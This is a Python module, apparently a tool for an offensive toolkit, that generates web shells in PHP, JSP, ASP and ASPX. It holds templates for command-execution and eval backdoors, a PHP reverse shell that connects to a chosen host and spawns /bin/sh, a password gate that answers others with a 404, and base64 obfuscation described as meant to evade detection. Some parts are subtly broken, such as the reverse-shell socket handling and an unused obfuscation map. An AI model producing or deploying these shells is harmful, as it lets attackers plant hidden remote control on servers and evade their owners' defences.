"""
Web Shell Generator — generate web shells in PHP/JSP/ASP with optional obfuscation.
"""

import base64
import random
import string
from typing import Any

_SHELLS = {
    "php": {
        "cmd": '<?php system($_GET["{param}"]); ?>',
        "eval": '<?php eval(base64_decode($_POST["{param}"])); ?>',
        "reverse": '<?php $sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>',
        "full": """<?php
@error_reporting(0);
function encrypt($d,$k){$r='';for($i=0;$i<strlen($d);$i++){$r.=$d[$i]^$k[$i%strlen($k)];}return $r;}
if(isset($_POST['{param}'])){$data=encrypt(base64_decode($_POST['{param}']),'{key}');
eval($data);}
?>""",
    },
    "jsp": {
        "cmd": '<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("{param}")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>',
        "eval": '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(new String[]{{"sh","-c",request.getParameter("{param}")}}); %>',
    },
    "asp": {
        "cmd": '<% Dim shell: Set shell=CreateObject("WScript.Shell"): Response.Write(shell.Exec(Request.QueryString("{param}")).StdOut.ReadAll) %>',
        "eval": '<% ExecuteGlobal(Request.Form("{param}")) %>',
    },
    "aspx": {
        "cmd": '<%@ Page Language="C#" %><% System.Diagnostics.Process p=new System.Diagnostics.Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["{param}"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>',
    },
}

_FILENAME_HINTS = {
    "php": "shell.php",
    "jsp": "shell.jsp",
    "asp": "shell.asp",
    "aspx": "shell.aspx",
}


def _obfuscate_php(code: str) -> str:
    """Obfuscate PHP shell via base64 + variable randomization."""
    var_map = {}
    for var in ["_GET", "_POST", "system", "eval", "exec", "fsockopen"]:
        rand = "_" + "".join(random.choices(string.ascii_lowercase, k=6))
        var_map[var] = rand

    b64 = base64.b64encode(code.encode()).decode()
    return f'<?php eval(base64_decode("{b64}")); ?>'


def _obfuscate_general(code: str) -> str:
    """Generic obfuscation via base64 comment injection."""
    b64 = base64.b64encode(code.encode()).decode()
    return f"<!-- {b64[:20]} -->\n{code}"


async def webshell_gen(
    language: str = "php",
    shell_type: str = "cmd",
    obfuscate: bool = False,
    password: str = "",
    param_name: str = "cmd",
    reverse_host: str = "",
    reverse_port: int = 4444,
) -> dict:
    """Generate a web shell payload.

    Args:
        language:     Shell language — ``"php"``, ``"jsp"``, ``"asp"``, or ``"aspx"``.
        shell_type:   Shell type — ``"cmd"`` (command exec), ``"eval"`` (eval code), or ``"reverse"`` (reverse shell).
        obfuscate:    Apply obfuscation to evade detection (default False).
        password:     Optional password protection for the shell.
        param_name:   Parameter name for command input (default ``"cmd"``).
        reverse_host: Host for reverse shell (required if shell_type="reverse").
        reverse_port: Port for reverse shell (default 4444).

    Returns:
        A dict with shell_code, language, shell_type, filename_hint, obfuscated, error.
    """
    result: dict[str, Any] = {
        "shell_code": "",
        "language": language,
        "shell_type": shell_type,
        "filename_hint": _FILENAME_HINTS.get(language, "shell.txt"),
        "obfuscated": obfuscate,
        "error": None,
    }

    if language not in _SHELLS:
        result["error"] = f"Unsupported language: '{language}'. Must be one of: {', '.join(sorted(_SHELLS))}."
        return result

    templates = _SHELLS[language]
    if shell_type not in templates:
        result["error"] = f"Shell type '{shell_type}' not available for {language}. Available: {', '.join(sorted(templates))}."
        return result

    if shell_type == "reverse" and not reverse_host:
        result["error"] = "reverse_host is required for reverse shell type."
        return result

    template = templates[shell_type]

    if shell_type == "reverse":
        shell_code = template.format(host=reverse_host, port=reverse_port, param=param_name)
    else:
        key = "".join(random.choices(string.ascii_letters + string.digits, k=16)) if password else ""
        shell_code = template.format(param=param_name, key=key)

    if password and language == "php":
        pw_hash = __import__("hashlib").md5(password.encode()).hexdigest()
        auth_check = f"""<?php if(md5($_POST['auth'])!='{pw_hash}'){{http_response_code(404);die();}}?>
"""
        shell_code = auth_check + shell_code

    if obfuscate:
        if language == "php":
            shell_code = _obfuscate_php(shell_code)
        else:
            shell_code = _obfuscate_general(shell_code)

    result["shell_code"] = shell_code
    return result
